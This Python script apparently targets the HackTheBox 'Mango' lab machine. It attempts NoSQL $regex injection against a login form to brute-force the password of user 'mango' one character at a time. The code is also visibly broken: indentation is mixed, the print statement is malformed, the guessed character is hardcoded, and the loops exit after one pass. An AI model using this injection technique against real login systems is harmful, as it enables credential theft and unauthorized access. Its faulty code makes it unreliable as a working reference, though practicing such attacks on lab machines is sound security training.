import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username = 'mango'
password = ''
URL = 'http://staging-order.mango.htb/index.php'

while True:
    for c in string.printable:
    	if c not in ['*', '+', '.', '?', '|', '#', '&', '$']:
	  #payload = "?username=mango&password[$regex]=f.*&login=login"
          #payload = '?username=%s&password[$regex]=%s.*&login=login' % (username, "f")
	  payload = '{"username": "%s", "password[$regex]":"%s.*"}'%(username, "f")
          #r = requests.get(URL, params=payload)
	  r = requests.post(URL, data = payload, verify = False, allow_redirects = False)        
	  print("[*] Response: %s") % (r) 
	  print(URL + payload)
	break
    break
